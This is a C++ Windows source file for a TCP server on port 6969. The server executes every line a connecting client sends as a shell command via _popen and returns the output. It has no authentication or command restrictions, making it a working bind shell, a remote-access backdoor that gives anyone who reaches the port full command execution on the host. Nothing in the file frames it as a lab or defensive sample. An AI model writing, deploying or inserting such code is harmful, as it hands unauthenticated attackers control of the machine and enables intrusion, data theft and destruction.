#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <memory>
#include <cstdio>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")

class Server {
public:
    Server(const std::string& port) {
        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            throw std::runtime_error("WSAStartup failed: " + std::to_string(iResult));
        }

        listener_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listener_fd == INVALID_SOCKET) {
            WSACleanup();
            throw std::runtime_error("Socket creation failed: " + std::to_string(WSAGetLastError()));
        }

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY;
        server_addr.sin_port = htons(std::stoi(port));

        iResult = bind(listener_fd, (SOCKADDR*)&server_addr, sizeof(server_addr));
        if (iResult == SOCKET_ERROR) {
            closesocket(listener_fd);
            WSACleanup();
            throw std::runtime_error("Binding failed: " + std::to_string(WSAGetLastError()));
        }

        iResult = listen(listener_fd, SOMAXCONN);
        if (iResult == SOCKET_ERROR) {
            closesocket(listener_fd);
            WSACleanup();
            throw std::runtime_error("Listen failed: " + std::to_string(WSAGetLastError()));
        }
    }

    void run() {
        while (true) {
            sockaddr_in client_addr;
            int addr_size = sizeof(client_addr);
            SOCKET client_fd = accept(listener_fd, (SOCKADDR*)&client_addr, &addr_size);
            if (client_fd == INVALID_SOCKET) {
                std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
                continue;
            }

            std::cout << "New connection established." << std::endl;
            handle_client(client_fd);
        }
    }

    ~Server() {
        closesocket(listener_fd);
        WSACleanup();
    }

private:
    SOCKET listener_fd;

    void handle_client(SOCKET client_fd) {
        char buffer[1024];
        int bytes_received;

        while (true) {
           
            memset(buffer, 0, sizeof(buffer));

            
            bytes_received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                std::cout << "Client disconnected." << std::endl;
                break;
            }

            buffer[bytes_received] = '\0'; 
            std::cout << "Received command: " << buffer << std::endl;

            
            std::string output = execute_command(buffer);

            if(output.empty()){
                output.append("done");
            }
            send(client_fd, output.c_str(), output.length(), 0);
        }

        closesocket(client_fd);
    }

    std::string execute_command(const std::string& command) {
        std::string result;
        char buffer[128];
        std::shared_ptr<FILE> pipe(_popen(command.c_str(), "r"), _pclose);
        if (!pipe) {
            result = "Failed to run command\n";
            return result;
        }

       
        while (fgets(buffer, sizeof(buffer), pipe.get()) != nullptr) {
            result += buffer;
        }

        return result;
    }
};

int main() {
    try {
        Server server("6969");
        std::cout << "Server is running on port 6969..." << std::endl;
        server.run();
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
    }

    return 0;
}
